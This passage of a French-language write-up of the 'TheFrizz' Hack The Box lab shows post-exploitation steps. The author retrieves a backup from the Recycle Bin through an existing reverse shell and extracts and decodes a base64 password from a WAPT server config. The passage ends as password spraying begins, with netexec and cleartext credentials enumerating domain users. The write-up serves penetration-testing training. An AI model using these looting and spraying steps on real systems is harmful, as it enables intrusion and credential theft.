+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>           <span class="mf">3</span><span class="p">/</span><span class="mf">10</span><span class="p">/</span><span class="mf">2025</span>  <span class="mf">3</span><span class="err">:</span><span class="mf">39</span> <span class="n">PM</span>                <span class="n">inetpub</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>            <span class="mf">5</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2021</span>  <span class="mf">1</span><span class="err">:</span><span class="mf">15</span> <span class="n">AM</span>                <span class="n">PerfLogs</span>
+</span></span><span class="line"><span class="cl"><span class="nb">d-r</span><span class="p">--</span>           <span class="mf">7</span><span class="p">/</span><span class="mf">24</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">12</span><span class="err">:</span><span class="mf">35</span> <span class="n">PM</span>                <span class="n">Program</span> <span class="n">Files</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>            <span class="mf">5</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2021</span>  <span class="mf">2</span><span class="err">:</span><span class="mf">34</span> <span class="n">AM</span>                <span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">d-r</span><span class="p">--</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">31</span> <span class="n">AM</span>                <span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>           <span class="mf">3</span><span class="p">/</span><span class="mf">10</span><span class="p">/</span><span class="mf">2025</span>  <span class="mf">3</span><span class="err">:</span><span class="mf">41</span> <span class="n">PM</span>                <span class="n">Windows</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">28</span> <span class="n">AM</span>                <span class="n">xampp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">ls </span><span class="n">-force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">31</span> <span class="n">AM</span>                <span class="nv">$RECYCLE</span><span class="p">.</span><span class="py">BIN</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-h</span><span class="p">-</span>           <span class="mf">3</span><span class="p">/</span><span class="mf">10</span><span class="p">/</span><span class="mf">2025</span>  <span class="mf">3</span><span class="err">:</span><span class="mf">31</span> <span class="n">PM</span>                <span class="nv">$WinREAgent</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-hs</span>           <span class="mf">7</span><span class="p">/</span><span class="mf">24</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">12</span><span class="err">:</span><span class="mf">36</span> <span class="n">PM</span>                <span class="n">Config</span><span class="p">.</span><span class="py">Msi</span>
+</span></span><span class="line"><span class="cl"><span class="n">l</span><span class="p">-</span><span class="n">-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">9</span><span class="err">:</span><span class="mf">12</span> <span class="n">AM</span>                <span class="n">Documents</span> <span class="n">and</span> <span class="n">Settings</span> <span class="p">-&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>           <span class="mf">3</span><span class="p">/</span><span class="mf">10</span><span class="p">/</span><span class="mf">2025</span>  <span class="mf">3</span><span class="err">:</span><span class="mf">39</span> <span class="n">PM</span>                <span class="n">inetpub</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>            <span class="mf">5</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2021</span>  <span class="mf">1</span><span class="err">:</span><span class="mf">15</span> <span class="n">AM</span>                <span class="n">PerfLogs</span>
+</span></span><span class="line"><span class="cl"><span class="nb">d-r</span><span class="p">--</span>           <span class="mf">7</span><span class="p">/</span><span class="mf">24</span><span class="p">/</span><span class="mf">2025</span> <span class="mf">12</span><span class="err">:</span><span class="mf">35</span> <span class="n">PM</span>                <span class="n">Program</span> <span class="n">Files</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>            <span class="mf">5</span><span class="p">/</span><span class="mf">8</span><span class="p">/</span><span class="mf">2021</span>  <span class="mf">2</span><span class="err">:</span><span class="mf">34</span> <span class="n">AM</span>                <span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-h</span><span class="p">-</span>           <span class="mf">8</span><span class="p">/</span><span class="mf">25</span><span class="p">/</span><span class="mf">2025</span>  <span class="mf">5</span><span class="err">:</span><span class="mf">28</span> <span class="n">AM</span>                <span class="n">ProgramData</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">9</span><span class="err">:</span><span class="mf">12</span> <span class="n">AM</span>                <span class="n">Recovery</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">25</span> <span class="n">AM</span>                <span class="n">System</span> <span class="n">Volume</span> <span class="n">Information</span>
+</span></span><span class="line"><span class="cl"><span class="nb">d-r</span><span class="p">--</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">31</span> <span class="n">AM</span>                <span class="n">Users</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>           <span class="mf">3</span><span class="p">/</span><span class="mf">10</span><span class="p">/</span><span class="mf">2025</span>  <span class="mf">3</span><span class="err">:</span><span class="mf">41</span> <span class="n">PM</span>                <span class="n">Windows</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">----</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">28</span> <span class="n">AM</span>                <span class="n">xampp</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">8</span><span class="err">:</span><span class="mf">27</span> <span class="n">AM</span>          <span class="mf">12288</span> <span class="n">DumpStack</span><span class="p">.</span><span class="py">log</span><span class="p">.</span><span class="py">tmp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">cd </span><span class="s1">&#39;$RECYCLE.BIN&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="nv">$RECYCLE</span><span class="p">.</span><span class="n">BIN</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="n">-force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="nv">$RECYCLE</span><span class="p">.</span><span class="py">BIN</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">d</span><span class="p">-</span><span class="n">-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">31</span> <span class="n">AM</span>                <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">2386970044</span><span class="p">-</span><span class="mf">1145388522</span><span class="p">-</span><span class="mf">2932701813</span><span class="p">-</span><span class="mf">1103</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="nv">$RECYCLE</span><span class="p">.</span><span class="n">BIN</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">2386970044</span><span class="p">-</span><span class="mf">1145388522</span><span class="p">-</span><span class="mf">2932701813</span><span class="p">-</span><span class="mf">1103</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="nv">$RECYCLE</span><span class="p">.</span><span class="n">BIN</span><span class="p">\</span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">2386970044</span><span class="p">-</span><span class="mf">1145388522</span><span class="p">-</span><span class="mf">2932701813</span><span class="p">-</span><span class="mf">1103</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="n">-force</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="nv">$RECYCLE</span><span class="p">.</span><span class="n">BIN</span><span class="p">\</span><span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">21</span><span class="p">-</span><span class="mf">2386970044</span><span class="p">-</span><span class="mf">1145388522</span><span class="p">-</span><span class="mf">2932701813</span><span class="p">-</span><span class="mf">1103</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">31</span> <span class="n">AM</span>            <span class="mf">148</span> <span class="nv">$IE2XMEG</span><span class="p">.</span><span class="py">7z</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">24</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">9</span><span class="err">:</span><span class="mf">16</span> <span class="n">PM</span>       <span class="mf">30416987</span> <span class="nv">$RE2XMEG</span><span class="p">.</span><span class="py">7z</span>
+</span></span><span class="line"><span class="cl"><span class="n">-a-hs</span>          <span class="mf">10</span><span class="p">/</span><span class="mf">29</span><span class="p">/</span><span class="mf">2024</span>  <span class="mf">7</span><span class="err">:</span><span class="mf">31</span> <span class="n">AM</span>            <span class="mf">129</span> <span class="n">desktop</span><span class="p">.</span><span class="n">ini</span></span></span></code></pre></div></div>
+<p>J&rsquo;arrive à télécharger le fichier avec <strong><code>scp</code></strong>. Mais j&rsquo;ai une erreur lorsque j&rsquo;essais de le décompresser.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ scp <span class="s1">&#39;f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z&#39;</span> RE2XMEG.7z
+</span></span><span class="line"><span class="cl"><span class="nv">$RE2XMEG</span>.7z                                                                                         100%   29MB  10.8MB/s   00:02
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ 7z x RE2XMEG.7z
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span class="line"><span class="cl">p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,16 CPUs AMD Ryzen <span class="m">7</span> 5825U with Radeon Graphics          <span class="o">(</span>A50F00<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Scanning the drive <span class="k">for</span> archives:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> file, <span class="m">204800</span> bytes <span class="o">(</span><span class="m">200</span> KiB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extracting archive: RE2XMEG.7z
+</span></span><span class="line"><span class="cl">ERROR: RE2XMEG.7z
+</span></span><span class="line"><span class="cl">RE2XMEG.7z
+</span></span><span class="line"><span class="cl">Open ERROR: Can not open the file as <span class="o">[</span>7z<span class="o">]</span> archive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ERRORS:
+</span></span><span class="line"><span class="cl">Unexpected end of archive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Can<span class="err">&#39;</span>t open as archive: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Files: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Size:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Compressed: <span class="m">0</span></span></span></code></pre></div></div>
+<p>Donc je vais télécharger le fichier d&rsquo;une autre façon. Je copie le fichier <code>$RE2XMEG.7z</code> dans le répertoire <code>C:/programdata</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy-item</span> <span class="s1">&#39;$RE2XMEG.7z&#39;</span> <span class="n">-Destination</span> <span class="s1">&#39;C:/programdata/$RE2XMEG.7z&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-9.png"
+        data-srcset="/images/TheFrizz/TheFrizz-9.png, /images/TheFrizz/TheFrizz-9.png 1.5x, /images/TheFrizz/TheFrizz-9.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-9.png"
+        title="/images/TheFrizz/TheFrizz-9.png" width="1889" height="516" /></p>
+<p>Ensuite depuis mon reverse shell en tant que <code>w.werbservice</code>, je copie le fichier dans le répertoire <code>C:\xampp\htdocs\</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy-item</span> <span class="s1">&#39;C:/programdata/$RE2XMEG.7z&#39;</span> <span class="n">-Destination</span> <span class="s1">&#39;C:\xampp\htdocs\$RE2XMEG.7z&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-10.png"
+        data-srcset="/images/TheFrizz/TheFrizz-10.png, /images/TheFrizz/TheFrizz-10.png 1.5x, /images/TheFrizz/TheFrizz-10.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-10.png"
+        title="/images/TheFrizz/TheFrizz-10.png" width="1261" height="171" /></p>
+<p>Puis je télécharge le fichier sur le site web.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-8.png"
+        data-srcset="/images/TheFrizz/TheFrizz-8.png, /images/TheFrizz/TheFrizz-8.png 1.5x, /images/TheFrizz/TheFrizz-8.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-8.png"
+        title="/images/TheFrizz/TheFrizz-8.png" width="1320" height="232" /></p>
+<p>Je le décompresse ensuite.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/CVE-2023-45878 <span class="o">(</span>main<span class="o">)</span> ⚡
+</span></span><span class="line"><span class="cl">❯ 7z x <span class="s1">&#39;$RE2XMEG.7z&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7-Zip <span class="o">[</span>64<span class="o">]</span> 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span class="line"><span class="cl">p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_US.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,16 CPUs AMD Ryzen <span class="m">7</span> 5825U with Radeon Graphics          <span class="o">(</span>A50F00<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Scanning the drive <span class="k">for</span> archives:
+</span></span><span class="line"><span class="cl"><span class="m">1</span> file, <span class="m">30416987</span> bytes <span class="o">(</span><span class="m">30</span> MiB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extracting archive: <span class="nv">$RE2XMEG</span>.7z
+</span></span><span class="line"><span class="cl">--
+</span></span><span class="line"><span class="cl"><span class="nv">Path</span> <span class="o">=</span> <span class="nv">$RE2XMEG</span>.7z
+</span></span><span class="line"><span class="cl"><span class="nv">Type</span> <span class="o">=</span> 7z
+</span></span><span class="line"><span class="cl">Physical <span class="nv">Size</span> <span class="o">=</span> <span class="m">30416987</span>
+</span></span><span class="line"><span class="cl">Headers <span class="nv">Size</span> <span class="o">=</span> <span class="m">65880</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Method</span> <span class="o">=</span> 0A LZMA2:26 LZMA:20 BCJ2
+</span></span><span class="line"><span class="cl"><span class="nv">Solid</span> <span class="o">=</span> +
+</span></span><span class="line"><span class="cl"><span class="nv">Blocks</span> <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ERROR: Unsupported Method : wapt/lib/site-packages/setuptools/cli-arm64.exe
+</span></span><span class="line"><span class="cl">ERROR: Unsupported Method : wapt/lib/site-packages/setuptools/gui-arm64.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Sub items Errors: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Archives with Errors: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Sub items Errors: <span class="m">2</span></span></span></code></pre></div></div>
+<p>S&rsquo;y trouve un dossier pour <strong>WAPT Server</strong>, une solution logicielle pour le déploiement, la gestion et la maintenance des parcs informatiques en entreprise.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ <span class="nb">cd</span> wapt                                                                                                                           ⏎
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/wapt
+</span></span><span class="line"><span class="cl">❯ ls
+</span></span><span class="line"><span class="cl">auth_module_ad.py  languages              setuphelpers_macos.py    waptconsole.exe.manifest  waptmessage.exe       wapttftpserver
+</span></span><span class="line"><span class="cl">cache              lib                    setuphelpers.py          waptcrypto.py             waptpackage.py        wapttftpserver.exe
+</span></span><span class="line"><span class="cl">common.py          licencing.py           setuphelpers_unix.py     wapt-enterprise.ico       wapt.psproj           wapttray.exe
+</span></span><span class="line"><span class="cl">conf               log                    setuphelpers_windows.py  wapt-get.exe              waptpython.exe        waptutils.py
+</span></span><span class="line"><span class="cl">conf.d             private                ssl                      wapt-get.exe.manifest     waptpythonw.exe       waptwua
+</span></span><span class="line"><span class="cl">COPYING.txt        __pycache__            templates                wapt-get.ini              wapt-scanpackages.py  wgetwads32.exe
+</span></span><span class="line"><span class="cl">db                 revision.txt           trusted_external_certs   wapt-get.ini.tmpl         waptself.exe          wgetwads64.exe
+</span></span><span class="line"><span class="cl">DLLs               Scripts                unins000.msg             wapt-get.py               waptserver.exe
+</span></span><span class="line"><span class="cl">keyfinder.py       setupdevhelpers.py     version-full             waptguihelper.pyd         waptservice.exe
+</span></span><span class="line"><span class="cl">keys               setuphelpers_linux.py  waptbinaries.sha256      waptlicences.pyd          wapt-signpackages.py</span></span></code></pre></div></div>
+<p>Dans le répertoire <strong><code>wapt/conf</code></strong> se trouve le fichier de configuration de WAPT Server (<strong><code>waptserver.ini</code></strong>). On y trouve le mot de passe chiffré en <code>base64</code> que je déchiffre.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/wapt
+</span></span><span class="line"><span class="cl">❯ <span class="nb">cd</span> conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/wapt/conf
+</span></span><span class="line"><span class="cl">❯ ls
+</span></span><span class="line"><span class="cl">ca-192.168.120.158.crt  forward_ssl_auth.conf  uwsgi_params    waptserver.ini.template
+</span></span><span class="line"><span class="cl">ca-192.168.120.158.pem  require_ssl_auth.conf  waptserver.ini
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/wapt/conf
+</span></span><span class="line"><span class="cl">❯ ls
+</span></span><span class="line"><span class="cl">ca-192.168.120.158.crt  forward_ssl_auth.conf  uwsgi_params    waptserver.ini.template
+</span></span><span class="line"><span class="cl">ca-192.168.120.158.pem  require_ssl_auth.conf  waptserver.ini
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/wapt/conf
+</span></span><span class="line"><span class="cl">❯ cat waptserver.ini
+</span></span><span class="line"><span class="cl"><span class="o">[</span>options<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">allow_unauthenticated_registration</span> <span class="o">=</span> True
+</span></span><span class="line"><span class="cl"><span class="nv">wads_enable</span> <span class="o">=</span> True
+</span></span><span class="line"><span class="cl"><span class="nv">login_on_wads</span> <span class="o">=</span> True
+</span></span><span class="line"><span class="cl"><span class="nv">waptwua_enable</span> <span class="o">=</span> True
+</span></span><span class="line"><span class="cl"><span class="nv">secret_key</span> <span class="o">=</span> ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ
+</span></span><span class="line"><span class="cl"><span class="nv">server_uuid</span> <span class="o">=</span> 646d0847-f8b8-41c3-95bc-51873ec9ae38
+</span></span><span class="line"><span class="cl"><span class="nv">token_secret_key</span> <span class="o">=</span> 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD
+</span></span><span class="line"><span class="cl"><span class="nv">wapt_password</span> <span class="o">=</span> <span class="nv">IXN1QmNpZ0BNZWhUZWQhUgo</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="nv">clients_signing_key</span> <span class="o">=</span> C:<span class="se">\w</span>apt<span class="se">\c</span>onf<span class="se">\c</span>a-192.168.120.158.pem
+</span></span><span class="line"><span class="cl"><span class="nv">clients_signing_certificate</span> <span class="o">=</span> C:<span class="se">\w</span>apt<span class="se">\c</span>onf<span class="se">\c</span>a-192.168.120.158.crt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>tftpserver<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">root_dir</span> <span class="o">=</span> c:<span class="se">\w</span>apt<span class="se">\w</span>aptserver<span class="se">\r</span>epository<span class="se">\w</span>ads<span class="se">\p</span>xe
+</span></span><span class="line"><span class="cl"><span class="nv">log_path</span> <span class="o">=</span> c:<span class="se">\w</span>apt<span class="se">\l</span>og
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz/wapt/conf
+</span></span><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="s2">&#34;IXN1QmNpZ0BNZWhUZWQhUgo=&#34;</span> <span class="p">|</span> base64 -d
+</span></span><span class="line"><span class="cl">!suBcig@MehTed!R</span></span></code></pre></div></div>
+<h3 id="password-spraying">Password Spraying</h3>
+<p>Puis avec <code>netexec</code>, j’énumère les utilisateurs du domaine pour me faire une wordlist.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ nxc smb frizzdc.frizz.htb -u <span class="s1">&#39;f.frizzle&#39;</span> -p <span class="s1">&#39;Jenni_Luvs_Magic23&#39;</span> -k --users <span class="p">|</span> awk <span class="s1">&#39;{print($5)}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span>
+</span></span><span class="line"><span class="cl">-Username-
+</span></span><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">krbtgt
